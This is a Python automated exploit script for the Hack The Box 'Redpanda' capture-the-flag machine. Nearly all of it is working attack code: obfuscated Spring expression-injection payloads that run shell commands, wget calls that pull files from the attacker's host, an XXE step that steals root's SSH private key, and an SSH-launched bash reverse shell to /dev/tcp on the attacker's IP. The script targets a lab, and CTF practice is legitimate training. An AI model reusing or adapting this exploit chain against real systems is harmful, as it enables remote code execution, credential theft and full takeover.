import argparse
import requests                 # pip3 install requests
import shlex
import signal
import subprocess
import sys
import time

from bs4 import BeautifulSoup   # pip3 install BeautifulSoup4
from pwn import *               # pip3 install pwntools

# Autopwn Redpanda HTB machine
# ----------------------------
# author : Marss
# date : Sep 21, 2022

# ctrl + c
def signal_handler(signum, frame):
    sys.exit('\n[!] Interrupted.')

signal.signal(signal.SIGINT, signal_handler)

# global variables
redpanda_ip = '10.10.11.170'
pwned_jpg = 'pwned.jpg'
pwned_xml = 'pwned_creds.xml'
pwned_log = 'redpanda.log'
share_server = 'share_server.sh'
workstation = '/tmp/.privesc'

# create SSTI inyection
def create_inyection(command):
    command_convertion = ''
    position = 0
    
    for character in command:     
        character_value = ord(character) # 97 = ord('a')
        java_convertion = f'T(java.lang.Character).toString({character_value})'

        # convertion by position (brackets)
        if position == 0:
            command_convertion += java_convertion + '.concat('
        elif position < len(command) - 1: 
            command_convertion += (java_convertion + ').concat(')
        else:
            command_convertion += (java_convertion + ')')
        position += 1

    payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(%s).getInputStream())}' % command_convertion
    
    return payload

# return SSTI inyection
def get_inyection(command): 
    return create_inyection(command)

# make post request
def make_request(payload):
    try:
        # create session
        session = requests.Session()
        
        headers = {'Content-Type' : 'application/x-www-form-urlencoded'}
        post_data = 'name=' + get_inyection(payload)
        
        session.post(f'http://{redpanda_ip}:8080/search', headers=headers, data=post_data)

    except Exception as e:
        sys.exit(f'\n[x] {e}')


# execute remote command
def run_redpanda_command(name, inyection):
    command = inyection[name]
    make_request(command)

# execute local command
def run_local_command(command):
    process = subprocess.Popen(shlex.split(command), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return process

# upload .xml, .jpg and log file
def upload_files(args, progress):
    # inyection commands
    inyection = {
        'workstation created' : f'mkdir -p {workstation}',
        '.jpg uploaded' : f'wget http://{args.ip}:{args.port}/{pwned_jpg} -P {workstation}', 
        '.xml uploaded' : f'wget http://{args.ip}:{args.port}/{pwned_xml} -P {workstation}',
        'logs uploaded' : f'wget http://{args.ip}:{args.port}/{pwned_log} -O /opt/panda_search/{pwned_log}',
        'web server uploaded' : f'wget http://{args.ip}:{args.port}/{share_server} -P {workstation}'
    }
    
    time.sleep(2)
    progress.status(f'Opening web server by port {args.port} to share files')
    
    try:
        # share webserver
        server_process = run_local_command(f'/usr/bin/python3 -m http.server {args.port}')
    
        # excute inyection commands (SSTI)
        for command in inyection:
            time.sleep(1);
            run_redpanda_command(command, inyection)
            log.info(command)
        
        # kill webserver process
        server_process.kill()
        
        time.sleep(2)
        log.success('Files uploaded.')
        
    except Exception as error:
        progress.failure(f'{error} ocurred.')

# wait for log file processing
def xxe_attack_processing(args, progress):
    time.sleep(2)
    progress.status(f'Wait for XXE attack processing')

    for i in range(0, 130):
        time.sleep(1)
        progress.status(str(i) + ' (*/2 * * * * cron process)')
    log.success('Successful XXE attack.')

# download .xml with processed data and extract key
def download_and_extract_key(args, progress, local_commands, remote_commands):
    time.sleep(2)
    progress.status('Downloading .xml file to extract id_rsa private key (root user)') 

    # share webserver to local machine for specific time
    run_redpanda_command('share id_rsa_file', remote_commands)
    
    time.sleep(1)
    # wait to download id_rsa to redpanda machine
    run_local_command(local_commands['download id_rsa'])

    time.sleep(2)
    log.success('id_rsa_file downloaded')
    
    time.sleep(2)
    progress.status('Extracting private key')
    
    # extract id_rsa
    id_rsa_file = BeautifulSoup(open('id_rsa_file'), features='xml')
    id_rsa_content = id_rsa_file.xxe.string + '\n' # Important add '\n'!
    with open('id_rsa_root', 'w') as file:
        file.write(id_rsa_content)
    
    # assign permisisons to id_rsa 
    run_local_command(local_commands['assign permissions'])
    run_redpanda_command('kill server', remote_commands)

# create reverse shell coonnection
def reverse_shell(args, progress, local_command):
    time.sleep(1)
    progress.status('Starting reverse shell process')
    
    # listen mode to receive the shell
    time.sleep(1)
    print(f'\n[+] Open port {args.port} to receive shell. (e.g nc -lvnp {args.port})')
    input('Press to continue...')
    
    # execute reverse shell like root
    run_local_command(local_command)

# exploit process
def run(args):
    progress = log.progress('Starting attack')
    
    # create workstation and upload files to XXE attack
    upload_files(args, progress)

    # wait for XXE file processing and extract to local machine
    xxe_attack_processing(args, progress)

    # remote and local commands
    redpanda_machine = {
        'share id_rsa_file' : f'/bin/bash {workstation}/{share_server}',
        'remove files' : f'/usr/bin/rm -r {workstation}',
        'kill server': 'fuser -k 7777/tcp'
    }
    local_machine = {
        'download id_rsa' : f'/usr/bin/wget http://{redpanda_ip}:7777/{pwned_xml} -O id_rsa_file',
        'assign permissions' : '/usr/bin/chmod 600 id_rsa_root',
        'ssh reverse' : f'/usr/bin/ssh -q -i id_rsa_root root@{redpanda_ip} "/bin/bash -c \'/bin/bash -i >& /dev/tcp/{args.ip}/{args.port} 0>&1\'"'
    }

    # download .xml and extract private key
    download_and_extract_key(args, progress, local_machine, redpanda_machine)
 
    # remove workstation and files on redpanda machine
    run_redpanda_command('remove files', redpanda_machine)

    # init reverse shell by SSH
    reverse_shell(args, progress, local_machine['ssh reverse'])

# main program flow and argument declaration
if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Autopwn Redpanda HTB machine',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''Example:
        autopwn.py -i 10.10.10.10 -p 4444
        ''')

    parser.add_argument('-i', '--ip', required=True, help='specific IP to receive the shell')
    parser.add_argument('-p', '--port', required=True, type=int, help='specific PORT to receive the shell')

    args = parser.parse_args()

    run(args)
